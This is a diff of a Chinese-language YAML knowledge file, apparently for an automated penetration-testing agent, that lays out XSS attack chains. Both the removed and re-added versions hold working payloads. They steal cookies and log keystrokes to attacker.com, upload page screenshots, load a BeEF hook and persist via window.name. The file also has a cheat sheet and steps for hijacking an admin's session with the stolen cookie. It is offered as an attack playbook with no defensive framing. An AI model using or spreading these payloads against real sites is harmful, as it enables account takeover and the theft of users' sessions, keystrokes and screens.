@@ -1,163 +1,23 @@
-name: "跨站脚本攻击"
-description: "反射型、存储型、DOM型XSS攻击技术"
-domain: "web"
-version: "1.0"
+name: 跨站脚本攻击
+description: 反射型、存储型、DOM型XSS攻击技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - xss
-  - javascript
-
-knowledge: |
-  # XSS攻击链
-  
-  ## 反射型XSS攻击链
-  
-  ### 基础利用
-  
-  ```
-  1. 探测XSS
-     <script>alert(1)</script>
-  
-  2. 绕过过滤
-     <img src=x onerror=alert(1)>
-     <svg onload=alert(1)>
-  
-  3. 获取Cookie
-     <script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>
-  
-  4. 窃取数据
-     http://attacker.com/steal?c=PHPSESSID=xxx
-  ```
-  
-  ---
-  
-  ## 存储型XSS攻击链
-  
-  ### 长期钓鱼
-  
-  ```
-  1. 寻找存储点
-     - 评论区
-     - 用户资料
-     - 帖子内容
-  
-  2. 植入Payload
-     <script>fetch('http://attacker.com/log?c='+document.cookie)</script>
-  
-  3. 等待管理员访问
-     - 管理后台
-     - 审核页面
-  
-  4. 账户接管
-     - 使用窃取的Cookie登录
-  ```
-  
-  ---
-  
-  ## DOM型XSS攻击链
-  
-  ### 前端利用
-  
-  ```
-  1. 探测DOM sinks
-     - document.location
-     - document.URL
-     - eval()
-     - innerHTML
-  
-  2. 构造Payload
-     <img src=x onerror=location.href='http://attacker.com?c='+document.cookie>
-  
-  3. 利用
-     - 重定向
-     - 窃取数据
-  ```
-  
-  ---
-  
-  ## 完整攻击链示例
-  
-  ### 1. 基础Cookie窃取
-  
-  ```html
-  <script>
-  new Image().src="http://attacker.com/steal?c="+document.cookie;
-  </script>
-  ```
-  
-  ### 2. 键盘记录
-  
-  ```html
-  <script>
-  document.onkeypress=function(e){
-    new Image().src="http://attacker.com/log?k="+e.key;
-  }
-  </script>
-  ```
-  
-  ### 3. 屏幕截图
-  
-  ```html
-  <script>
-  html2canvas(document.body).then(canvas => {
-    fetch('http://attacker.com/upload', {
-      method: 'POST',
-      body: canvas.toDataURL()
-    });
-  });
-  </script>
-  ```
-  
-  ### 4. BeEF钩子
-  
-  ```html
-  <script src="http://attacker.com:3000/hook.js"></script>
-  ```
-  
-  ### 5. 绕过CSP + 持久化
-  
-  ```html
-  <script>
-  if(window.name !== 'xss'){
-    window.name = 'xss';
-    fetch('http://attacker.com/persist?d='+document.cookie);
-  }
-  </script>
-  ```
-  
-  ---
-  
-  ## 攻击链速查
-  
-  | 目标 | Payload | 说明 |
-  |------|---------|------|
-  | 弹窗测试 | `<script>alert(1)</script>` | 基础测试 |
-  | Cookie窃取 | `new Image().src="http://attacker?c="+document.cookie` | 会话劫持 |
-  | 键盘记录 | `document.onkeypress=function(e){...}` | 输入窃取 |
-  | 重定向 | `location.href='http://attacker'` | 钓鱼 |
-  | 持久化 | 存储型XSS | 长期控制 |
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- xss
+- javascript
+knowledge: "# XSS攻击链\n\n## 反射型XSS攻击链\n\n### 基础利用\n\n```\n1. 探测XSS\n   <script>alert(1)</script>\n\n2. 绕过过滤\n   <img src=x\
+  \ onerror=alert(1)>\n   <svg onload=alert(1)>\n\n3. 获取Cookie\n   <script>new Image().src=\"http://attacker.com/steal?c=\"\
+  +document.cookie;</script>\n\n4. 窃取数据\n   http://attacker.com/steal?c=PHPSESSID=xxx\n```\n\n---\n\n## 存储型XSS攻击链\n\n### 长期钓鱼\n\
+  \n```\n1. 寻找存储点\n   - 评论区\n   - 用户资料\n   - 帖子内容\n\n2. 植入Payload\n   <script>fetch('http://attacker.com/log?c='+document.cookie)</script>\n\
+  \n3. 等待管理员访问\n   - 管理后台\n   - 审核页面\n\n4. 账户接管\n   - 使用窃取的Cookie登录\n```\n\n---\n\n## DOM型XSS攻击链\n\n### 前端利用\n\n```\n1. 探测DOM\
+  \ sinks\n   - document.location\n   - document.URL\n   - eval()\n   - innerHTML\n\n2. 构造Payload\n   <img src=x onerror=location.href='http://attacker.com?c='+document.cookie>\n\
+  \n3. 利用\n   - 重定向\n   - 窃取数据\n```\n\n---\n\n## 完整攻击链示例\n\n### 1. 基础Cookie窃取\n\n```html\n<script>\nnew Image().src=\"http://attacker.com/steal?c=\"\
+  +document.cookie;\n</script>\n```\n\n### 2. 键盘记录\n\n```html\n<script>\ndocument.onkeypress=function(e){\n  new Image().src=\"\
+  http://attacker.com/log?k=\"+e.key;\n}\n</script>\n```\n\n### 3. 屏幕截图\n\n```html\n<script>\nhtml2canvas(document.body).then(canvas\
+  \ => {\n  fetch('http://attacker.com/upload', {\n    method: 'POST',\n    body: canvas.toDataURL()\n  });\n});\n</script>\n\
+  ```\n\n### 4. BeEF钩子\n\n```html\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n```\n\n### 5. 绕过CSP + 持久化\n\
+  \n```html\n<script>\nif(window.name !== 'xss'){\n  window.name = 'xss';\n  fetch('http://attacker.com/persist?d='+document.cookie);\n\
+  }\n</script>\n```\n\n---\n\n## 攻击链速查\n\n| 目标 | Payload | 说明 |\n|------|---------|------|\n| 弹窗测试 | `<script>alert(1)</script>`\
+  \ | 基础测试 |\n| Cookie窃取 | `new Image().src=\"http://attacker?c=\"+document.cookie` | 会话劫持 |\n| 键盘记录 | `document.onkeypress=function(e){...}`\
+  \ | 输入窃取 |\n| 重定向 | `location.href='http://attacker'` | 钓鱼 |\n| 持久化 | 存储型XSS | 长期控制 |\n"
